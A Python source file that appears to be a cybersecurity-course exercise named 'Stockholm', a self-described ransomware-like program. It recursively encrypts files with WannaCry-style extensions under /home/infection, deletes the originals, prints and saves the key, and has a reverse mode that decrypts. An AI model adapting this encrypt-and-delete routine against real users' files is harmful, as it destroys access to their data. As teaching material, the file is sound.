import os
from os.path import expanduser, isdir, isfile, join, splitext
import argparse
from cryptography.fernet import Fernet

Red = '\033[0;31m'
Green = '\033[0;32m'
Reset = '\033[0m'

ENCRYPTED_EXTENSION = ".ft"
TARGET_EXTENSIONS = [
    ".wannacry", ".wnry", ".wcry", ".wncry", ".wncrypt",
    ".wncryt", ".wnryt", ".wncrpt", ".wnrypt", ".wcrypt",
    ".wncrypt0r", ".wannacrypt", ".wannacrypt0r", ".wannacryptor",
    ".wncryptor", ".wannadecrypt0r", ".wannadecryptor",
    ".crypt", ".cry", ".crypted", ".crypt0r", ".cryptor",
    ".encrypted", ".enc", ".enc0r", ".encr", ".lock"]



def encrypt_file(file_path, key, args):
    try:
        with open(file_path, "rb") as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        file_name, file_extension = os.path.splitext(os.path.basename(file_path))
        new_file_name = file_name + file_extension + ENCRYPTED_EXTENSION

        new_file_path = os.path.join(os.path.dirname(file_path), new_file_name)

        with open(new_file_path, "wb") as file:
            file.write(encrypted_data)

        if not args.silent:
            print(f"Encrypted file: {new_file_path}")

        os.remove(file_path)

    except Exception as e:
        print(Red + f"Error encrypting file: {file_path}\n{e}" + Reset)


def encrypt_files_recursive(directory, key, args):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            file_extension = os.path.splitext(file)[1]
            if file_extension in TARGET_EXTENSIONS:
                encrypt_file(file_path, key, args)


def decrypt_file(file_path, key, args ):
    try:
        if os.path.isdir(file_path):
            print("Not the correct directory")
            return

        if not file_path.endswith(ENCRYPTED_EXTENSION):
            print("Not the correct file extension")
            return

        with open(file_path, "rb") as file:
            encrypted_data = file.read()

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        file_name, file_extension = os.path.splitext(os.path.basename(file_path))
        print("file_name = "+file_name)
        print("file_extension = "+file_extension)
        new_file_name = file_name
        print(new_file_name)
        new_file_path = os.path.join(os.path.dirname(file_path), new_file_name)
        print("new file path = "+new_file_path)

        with open(new_file_path, "wb") as file:
            file.write(decrypted_data)

        if not args.silent:
            print(f"Decrypted file: {new_file_path}")

        os.remove(file_path)

    except Exception as e:
        print(Red + f"Error decrypting file: {file_path}\n{e}" + Reset)


def decrypt_files_recursive(directory, key, args):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key, args)


def main():
    parser = argparse.ArgumentParser(description="Stockholm - Ransomware-like program for file encryption/decryption")
    parser.add_argument("-v", "--version", action="store_true", help="Show the version of the program")
    parser.add_argument("-r", "--reverse", metavar="KEY", help="Reverse the infection using the specified KEY")
    parser.add_argument("-s", "--silent", action="store_true", help="Do not produce any output")

    args = parser.parse_args()

    home_dir = '/home/'
    PATH = join(home_dir, 'infection')

    if not (home_dir and isdir(home_dir)):
        print(Red + "Error: Home directory not found" + Reset)
        exit(1)

    if not isdir(PATH):
        print(Red + 'Error: The directory was not found' + Reset)
        exit(1)

    if args.version:
        print(Green + "Stockholm v1.0" + Reset)
    elif args.reverse:
        key = args.reverse.encode()
        decrypt_files_recursive(PATH, key, args)
        print(Green + "All files have been decrypted successfully!" + Reset)
    else:
        key = Fernet.generate_key()
        if len(key) < 16:
            print(Red + 'Error: Key must be 16 characters' + Reset)
            exit(1)
        with open('key.txt', 'wb') as f:
            f.write(key)
        print(PATH)
        print(Green + f"Encryption key: {key.decode()}" + Reset)
        print("Make sure to keep the key secure to decrypt your files later.")
        encrypt_files_recursive(PATH, key, args)


if __name__ == "__main__":
    main()
